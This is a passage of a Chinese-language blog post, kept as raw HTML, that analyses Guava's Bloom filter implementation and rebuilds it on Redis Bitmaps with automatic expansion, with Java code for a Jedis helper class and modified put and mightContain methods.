-->\r\n<p>之前也提到了Guava没有使用java.util.BitSet，而是封装了一个long型的数组，另外还有一个long型整数，用来统计数组中已经占用（置为1）的数量，在第一个构造函数中，它把传入的long型整数按长度64分段（例如129分为3段），段数作为数组的长度，你可以想象成由若干个64位数组拼接成一个超长的数组，它的长度就是64乘以段数，即bitSize，在第二个构造函数中利用Long.bitCount方法来统计对应二进制编码中的1个数，这个方法在JDK1.5中就有了，其算法设计得非常精妙，有精力的同学可以自行研究。</p>\n<p>另外两个重要的方法是set和get，在get方法中，参考put和mightContain方法，传入的参数index是经过bitSize取模的，因此一定能落在这个超长数组的范围之内，为了获取index对应索引位置上的值，首先将其无符号右移6位，并且强制转换成int型，这相当于除以64向下取整的操作，也就是换算成段数，得到该段上的数值之后，又将1左移index位，最后进行按位与的操作，如果结果等于0，那么返回false，从而在mightContain中判断为不存在。在set方法中，首先调用了get方法判断是否已经存在，如果不存在，则用同样的逻辑取出data数组中对应索引位置的数值，然后按位或并赋值回去。</p>\n<p>到这里，对Guava中布隆过滤器的实现就基本讨论完了，简单总结一下：</p>\n<p>1.BloomFilter类的作用在于接收输入，利用公式完成对参数的估算，最后初始化Strategy接口的实例；</p>\n<p>2.BloomFilterStrategies是一个枚举类，具有两个实现了Strategy接口的成员，分别为MURMUR128_MITZ_32和MURMUR128_MITZ_64，另外封装了long型的数组作为布隆过滤器底层的bit数组，其中在get和set方法中完成核心的位运算。</p>\n<h2>三、利用Redis Bitmaps进行重构</h2>\n<p>通过上面的分析，主要算法和逻辑的部分大体都是一样的，真正需要重构的部分是底层位数组的实现，在Guava中是封装了一个long型的数组，而对于redis来说，本身自带了Bitmaps的“数据结构”（本质上还是一个字符串），已经提供了位操作的接口，因此重构本身并不复杂，相对比较复杂的是，之前提到的实现自动扩容特性。</p>\n<p>这里实现自动扩容的思想是，在redis中记录一个自增的游标cursor，如果当前key对应的Bitmaps已经达到饱和状态，则cursor自增，同时用其生成一个新的key，并创建规模同等的Bitmaps。然后在get的时候，需要判断该元素是否存在于任意一个Bitmaps中。于是整个的逻辑就变成，一个元素在每个Bitmaps中都不存在时，才能插入当前cursor对应key的Bitmaps中。</p>\n<p><img src=\"http://www.fullstackyang.com/wp-content/uploads/2017/12/QQ20171224-003813.png\" alt=\"\" width=\"801\" height=\"352\"></p>\n<p>下面是代码的实现部分。</p>\n<p>首先，为了简化redis的操作，定义了2个函数式接口，分别执行单条命令和pipeline，另外还实现了一个简单的工具类</p>\n<p><!-- Crayon Syntax Highlighter v_2.7.2_beta --></p>\n<div id=\"crayon-5a446fa2472ad605895102\">\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39e8bb1c3281254838\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">Java</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n@FunctionalInterface\r\npublic interface JedisExecutor&lt;T&gt; {\r\n    T execute(Jedis jedis);\r\n}\r\n\r\n@FunctionalInterface\r\npublic interface PipelineExecutor {\r\n    void load(Pipeline pipeline);\r\n}\r\n\r\npublic class JedisUtils {\r\n\r\n    private static final GenericObjectPoolConfig poolConfig = new GenericObjectPoolConfig();\r\n\r\n    private JedisPool jedisPool;\r\n\r\n    public JedisUtils() {\r\n        jedisPool = new JedisPool(poolConfig, \"localhost\", 6379);\r\n    }\r\n\r\n    public &lt;T&gt; T execute(JedisExecutor&lt;T&gt; jedisExecutor) {\r\n        try (Jedis jedis = jedisPool.getResource()) {\r\n            return jedisExecutor.execute(jedis);\r\n        }\r\n    }\r\n\r\n    public List&lt;Object&gt; pipeline(List&lt;PipelineExecutor&gt; pipelineExecutors) {\r\n        try (Jedis jedis = jedisPool.getResource()) {\r\n            Pipeline pipeline = jedis.pipelined();\r\n            for (PipelineExecutor executor : pipelineExecutors)\r\n                executor.load(pipeline);\r\n            return pipeline.syncAndReturnAll();\r\n        }\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c3281254838-35\">35</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c3281254838-1\"><span class=\"crayon-n\">@FunctionalInterface</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c3281254838-2\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">interface</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">JedisExecutor</span><span class=\"crayon-e \">&lt;T&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c3281254838-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">T</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">Jedis </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c3281254838-4\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c3281254838-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c3281254838-6\"><span class=\"crayon-n\">@FunctionalInterface</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c3281254838-7\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">interface</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">PipelineExecutor</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c3281254838-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">load</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">Pipeline </span><span class=\"crayon-v\">pipeline</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c3281254838-9\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c3281254838-10\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c3281254838-11\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">JedisUtils</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c3281254838-12\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c3281254838-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">GenericObjectPoolConfig </span><span class=\"crayon-v\">poolConfig</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">GenericObjectPoolConfig</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c3281254838-14\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c3281254838-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">JedisPool </span><span class=\"crayon-v\">jedisPool</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c3281254838-16\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c3281254838-17\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">JedisUtils</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c3281254838-18\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">jedisPool</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">JedisPool</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">poolConfig</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"localhost\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6379</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c3281254838-19\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c3281254838-20\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c3281254838-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">&lt;T&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">T</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">JedisExecutor</span><span class=\"crayon-e \">&lt;T&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedisExecutor</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c3281254838-22\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">try</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">Jedis </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedisPool</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getResource</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c3281254838-23\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedisExecutor</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c3281254838-24\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c3281254838-25\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c3281254838-26\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c3281254838-27\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">List</span><span class=\"crayon-e \">&lt;Object&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">pipeline</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">List</span><span class=\"crayon-e \">&lt;PipelineExecutor&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pipelineExecutors</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c3281254838-28\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">try</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">Jedis </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedisPool</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getResource</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c3281254838-29\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">Pipeline </span><span class=\"crayon-v\">pipeline</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">pipelined</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c3281254838-30\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">PipelineExecutor </span><span class=\"crayon-v\">executor</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pipelineExecutors</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c3281254838-31\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">executor</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">load</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pipeline</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c3281254838-32\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pipeline</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">syncAndReturnAll</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c3281254838-33\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c3281254838-34\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c3281254838-35\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0045 seconds] -->\r\n<br>\n其次在Strategy中，对put和mightContain作了一点修改，其中被注释的部分是Guava中的实现。为了简化，这里我们只接受String对象。\n<p>这里先把所有的随机函数对应的索引位置收集到一个数组中，然后交由底层的RedisBitmaps处理get或set，具体过程后面会详细说明。</p>\n<p>bits.ensureCapacityInternal()方法，即表示自动扩容，这个函数名是从ArrayList中搬过来的。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39e8bb1c7251545973\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">Java</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n    @ Override\r\n    public boolean put(String string, int numHashFunctions, RedisBitmaps bits) {\r\n        long bitSize = bits.bitSize();\r\n        byte[] bytes = Hashing.murmur3_128().hashString(string, Charsets.UTF_8).asBytes();\r\n        long hash1 = lowerEight(bytes);\r\n        long hash2 = upperEight(bytes);\r\n\r\n        boolean bitsChanged = false;\r\n        long combinedHash = hash1;\r\n//        for (int i = 0; i &lt; numHashFunctions; i++) {\r\n//            bitsChanged |= bits.set((combinedHash &amp; Long.MAX_VALUE) % bitSize);\r\n//            combinedHash += hash2;\r\n//        }\r\n        long[] offsets = new long[numHashFunctions];\r\n        for (int i = 0; i &lt; numHashFunctions; i++) {\r\n            offsets[i] = (combinedHash &amp; Long.MAX_VALUE) % bitSize;\r\n            combinedHash += hash2;\r\n        }\r\n        bitsChanged = bits.set(offsets);\r\n        bits.ensureCapacityInternal();//自动扩容\r\n        return bitsChanged;\r\n    }\r\n\r\n    @ Override\r\n    public boolean mightContain(String object, int numHashFunctions, RedisBitmaps bits) {\r\n        long bitSize = bits.bitSize();\r\n        byte[] bytes = Hashing.murmur3_128().hashString(object, Charsets.UTF_8).asBytes();\r\n        long hash1 = lowerEight(bytes);\r\n        long hash2 = upperEight(bytes);\r\n        long combinedHash = hash1;\r\n//        for (int i = 0; i &lt; numHashFunctions; i++) {\r\n//            if (!bits.get((combinedHash &amp; Long.MAX_VALUE) % bitSize)) {\r\n//                return false;\r\n//            }\r\n//            combinedHash += hash2;\r\n//        }\r\n//        return true;\r\n        long[] offsets = new long[numHashFunctions];\r\n        for (int i = 0; i &lt; numHashFunctions; i++) {\r\n            offsets[i] = (combinedHash &amp; Long.MAX_VALUE) % bitSize;\r\n            combinedHash += hash2;\r\n        }\r\n        return bits.get(offsets);\r\n    }</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1c7251545973-44\">44</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1c7251545973-1\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">@</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Override</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1c7251545973-2\"><span class=\"crayon-e\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">put</span><span class=\"crayon-sy\">(</span><span 